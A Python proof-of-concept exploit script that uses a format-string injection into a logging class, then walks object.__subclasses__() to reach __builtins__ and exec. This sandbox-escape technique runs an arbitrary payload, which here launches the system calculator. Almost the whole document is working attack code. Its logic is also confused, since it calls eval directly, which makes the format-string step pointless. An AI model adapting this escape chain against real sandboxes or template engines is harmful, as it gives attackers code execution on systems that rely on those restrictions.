class Logger:
    def __init__(self, log_format=None):
        self.format = log_format or "{message}"
    
    def log(self, message):
        """Normal looking logging function"""
        return self.format.format(message=message)

# The calculator command we want to execute
calculator_cmd = "import subprocess, platform; s=platform.system(); cmd=['calc.exe'] if s=='Windows' else ['open','-a','Calculator'] if s=='Darwin' else ['gnome-calculator']; subprocess.Popen(cmd)"

# Logger to access object class - can't call __subclasses__ directly in a format string
format_to_get_type = "{message.__class__}"
type_logger = Logger(format_to_get_type)
string_type = type_logger.log("dummy")  # Gets "<class 'str'>"

# We need to extract the type from the string representation
str_class = eval(string_type.replace("<class '", "").replace("'>", ""))

# Now we can access object and its subclasses
object_class = str_class.__mro__[1]  # This is 'object'
subclasses = object_class.__subclasses__()

# Printed for debugging - can be removed in production exploit
print(f"Found {len(subclasses)} subclasses of object")

# Let's try multiple approaches to find a class that can lead to code execution
for i, cls in enumerate(subclasses):
    # Look for classes that are most likely to have access to imports
    if cls.__name__ in ['WarningMessage', 'catch_warnings', 'Quitter', 'BuiltinImporter']:
        try:
            # Check if the class has globals
            if hasattr(cls.__init__, '__globals__'):
                globals_dict = cls.__init__.__globals__
                
                # Check if we have access to builtins
                if '__builtins__' in globals_dict:
                    # Try to execute our code using exec in builtins
                    builtin_dict = globals_dict['__builtins__']
                    
                    # Check if builtins is a module or dict
                    if isinstance(builtin_dict, dict) and 'exec' in builtin_dict:
                        exec_func = builtin_dict['exec']
                        exec_func(calculator_cmd)
                        print(f"Executed via {cls.__name__}")
                        break
                    elif hasattr(builtin_dict, 'exec'):
                        getattr(builtin_dict, 'exec')(calculator_cmd)
                        print(f"Executed via {cls.__name__}")
                        break
                
                # Alternative method: Access through sys.modules
                if 'sys' in globals_dict and hasattr(globals_dict['sys'], 'modules'):
                    modules = globals_dict['sys'].modules
                    if 'builtins' in modules:
                        builtins_module = modules['builtins']
                        if hasattr(builtins_module, 'exec'):
                            getattr(builtins_module, 'exec')(calculator_cmd)
                            print(f"Executed via sys.modules from {cls.__name__}")
                            break
        except Exception as e:
            # Try next class if this one fails
            continue

print("Exploit complete")
